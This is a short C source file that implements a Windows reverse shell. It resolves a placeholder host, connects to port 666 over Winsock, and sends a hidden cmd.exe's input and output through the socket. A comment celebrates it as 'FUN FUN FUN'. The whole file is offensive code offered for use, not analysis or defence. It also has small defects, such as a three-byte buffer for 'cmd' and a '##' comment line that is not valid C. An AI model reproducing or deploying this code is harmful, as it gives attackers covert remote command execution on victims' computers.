#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

## dns resolver + reverse shell in c = FUN FUN FUN !!!

int main (){

	WSADATA wsdata;
	WSAStartup(MAKEWORD(2,2),&wsdata);

	struct hostent *remote;
	char host[20] = "your host";

        remote = gethostbyname(host);
	char *ip = inet_ntoa(*((struct in_addr *)remote->h_addr));

	SOCKET s;
	int porta = 666;

	struct sockaddr_in alvo;
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(porta);
	alvo.sin_addr.s_addr = inet_addr(ip);

	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0,0,0);
	WSAConnect(s, (struct sockaddr *)&alvo , sizeof(alvo),0,0,0,0);
	//
	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)s;
	ini_processo.dwFlags=STARTF_USESTDHANDLES;

	if (WSAGetLastError()== 0) {
		char process[3] = "cmd";
		CreateProcess(NULL, process, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &ini_processo, &processo_info);
}
	else {exit(0);}
	return 0;
}
